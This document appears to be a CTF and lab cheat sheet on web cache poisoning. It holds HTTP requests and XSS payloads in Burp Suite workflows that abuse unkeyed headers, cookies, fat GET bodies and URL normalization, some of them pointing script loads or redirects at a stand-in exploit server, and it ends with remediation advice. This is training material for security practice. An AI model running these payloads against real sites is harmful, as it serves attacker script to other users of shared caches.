# Web Cache Poisoning — CTF Cheat Sheet

**Tools:** Burp Suite Community / Professional, Param Miner BApp, Repeater  
**Practice:** PortSwigger Web Security Academy  
**Scope:** Authorized CTFs and lab environments only

---

## 1. CTF Methodology

Web Cache Poisoning occurs when an attacker manipulates unkeyed inputs (headers, cookies, or parameters ignored by the cache key) to inject a harmful response into a shared cache, serving it to other users.

```
Identify Unkeyed Input (Param Miner / Manual probe)
          │
          ├── Unkeyed Headers: X-Forwarded-Host, X-Host, X-Forwarded-Scheme
          ├── Unkeyed Cookies: fehost, tracking
          └── Unkeyed Query Params: utm_content, callback in Fat GETs
          │
Verify Reflection / State Change
          │
          ├── Reflected in script src: <script src="//UNKEYED_HOST/tracker.js">
          ├── Reflected in HTML/DOM: <meta ... content="UNKEYED_COOKIE">
          └── Triggers 302 Redirect to unkeyed host
          │
Establish Cache Busting (Prevent poisoning live users during testing)
          │  Add a unique query string to the cache key: ?cb=12345
          │
Poison the Cache Entry
          │  Send request without cache-buster until response header shows:
          │  X-Cache: hit (or Age: > 0)
```

---

## 2. Reconnaissance & Param Miner

1. Right-click request in Burp → **Extensions → Param Miner → Guess headers** (or **Guess params**).
2. Review **Output** or **Target → Issues** for discovered unkeyed headers:
   - `X-Forwarded-Host`
   - `X-Host`
   - `X-Forwarded-Scheme`
   - `X-Original-URL`

---

## 3. High-Yield Poisoning Scenarios

### 1. Unkeyed Header Importing External JavaScript
- **Vulnerability:** The application constructs static resource URLs using the unkeyed `X-Forwarded-Host` header:
  ```http
  GET /?cb=test1 HTTP/2
  Host: TARGET.net
  X-Forwarded-Host: EXPLOIT-SERVER-SUBDOMAIN
  ```
- **Response:**
  ```html
  <script src="//EXPLOIT-SERVER-SUBDOMAIN/resources/js/tracking.js"></script>
  ```
- **Exploitation:**
  1. On your Exploit Server, create `/resources/js/tracking.js` with payload: `alert(document.cookie)`.
  2. Remove the cache-buster `?cb=test1`.
  3. Send the request repeatedly to Repeater until the response shows `X-Cache: hit`.
  4. Any subsequent user visiting the home page executes the poisoned JavaScript.

---

### 2. Unkeyed Cookie Reflection
- **Vulnerability:** A cookie is reflected into the page body, but the cache key only tracks the path:
  ```http
  GET /?cb=123 HTTP/2
  Host: TARGET.net
  Cookie: fehost=someString"-alert(1)-"
  ```
- **Response:**
  ```html
  <script>initFrontend('someString"-alert(1)-"');</script>
  ```
- **Exploitation:** Send with malicious payload until `X-Cache: hit`, then all users accessing `/` without the cookie receive the cached XSS payload.

---

### 3. Multiple Headers (Chaining Host & Scheme)
- **Vulnerability:** Server generates redirects based on `X-Forwarded-Host` only when `X-Forwarded-Scheme: nothttps` is present:
  ```http
  GET /resources/js/tracking.js HTTP/2
  Host: TARGET.net
  X-Forwarded-Host: EXPLOIT-SERVER-SUBDOMAIN
  X-Forwarded-Scheme: nothttps
  ```
- **Response:**
  ```http
  HTTP/2 302 Found
  Location: https://EXPLOIT-SERVER-SUBDOMAIN/resources/js/tracking.js
  ```
- **Result:** The redirect is cached. When victims request `/resources/js/tracking.js`, they are redirected to your malicious script.

---

### 4. Fat GET Requests (Unkeyed Body Parameters)
- **Vulnerability:** The cache key is derived solely from the request line (`GET /js/geolocate.js?callback=setCountryCookie`), but the backend processes parameters supplied in the HTTP request body:
  ```http
  GET /js/geolocate.js?callback=setCountryCookie HTTP/2
  Host: TARGET.net
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 27

  callback=alert(1)
  ```
- **Response:**
  ```javascript
  alert(1)({"country":"United Kingdom"});
  ```
- **Result:** Poisoned body is served to every user requesting `/js/geolocate.js?callback=setCountryCookie`.

---

### 5. URL Normalization Poisoning
- **Vulnerability:** The cache normalizes special characters in the URL, but the backend application reflects the raw path into an error page or link:
  ```http
  GET /random</script><script>alert(1)</script> HTTP/2
  ```
- The browser encodes this request when requesting, but if the cache stores the unencoded reflection under the normalized key, visiting the normalized link executes XSS.

---

## 4. CTF Quick Reference

| Attack Pattern | Unkeyed Vector | Exploit Mechanism |
|---|---|---|
| **Script Import Poisoning** | `X-Forwarded-Host` | Point `<script src>` to Exploit Server |
| **Cookie Poisoning** | `Cookie: fehost=...` | Inject XSS into reflected cookie |
| **Redirect Poisoning** | `X-Forwarded-Scheme: http` | Cache 302 redirect to external domain |
| **Fat GET Poisoning** | Body param in GET request | Override callback function in JSONP/JS |
| **Targeted User-Agent** | Unkeyed header + Keyed UA | Target specific victim browser (e.g. Chrome) |

---

## 5. Remediation

- **Eliminate Unkeyed Inputs:** Add all inputs that influence the HTTP response into the cache key, or completely ignore them.
- **Disable Unkeyed Forwarded Headers:** Strip `X-Forwarded-Host`, `X-Host`, and related proxy headers at the front-end reverse proxy.
- **Disable Fat GET Requests:** Configure the web server and cache to reject `GET` requests that contain an HTTP message body.
- **Set Cache-Control: private:** Ensure personalized or dynamic responses include `Cache-Control: private, no-store`.
